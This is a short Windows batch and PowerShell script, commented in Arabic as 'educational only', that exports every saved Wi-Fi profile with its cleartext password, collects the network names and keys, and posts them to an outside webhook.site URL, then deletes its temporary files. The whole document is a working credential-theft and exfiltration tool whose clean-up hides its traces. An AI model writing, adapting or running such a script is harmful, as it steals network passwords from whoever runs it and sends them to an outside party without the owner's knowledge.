@echo off
setlocal

REM ============================================================
REM  هذا السكربت لأغراض تعليمية فقط
REM  يقوم بتصدير شبكات Wi-Fi المحفوظة وإرسالها إلى webhook
REM ============================================================

set "p=%temp%\p"
if not exist "%p%" md "%p%" >nul 2>&1
pushd "%p%"

REM تصدير جميع بروفايلات Wi-Fi مع كلمات المرور بصيغة XML
netsh wlan export profile key=clear >nul 2>&1

REM قراءة الملفات، استخراج الاسم وكلمة المرور، وإرسالها إلى الـ webhook
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$r = Get-ChildItem | ForEach-Object { $x = [xml](Get-Content $_.FullName); [PSCustomObject]@{ Name = $x.WLANProfile.Name; Password = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial } }; ^
   $fence = [string][char]96 * 3; ^
   $b = @{ content = $fence + ($r | Format-Table | Out-String) + $fence } | ConvertTo-Json; ^
   Invoke-RestMethod -Uri 'https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822' -Method Post -Body $b -ContentType 'application/json'"

popd
rmdir /s /q "%p%" >nul 2>&1

endlocal
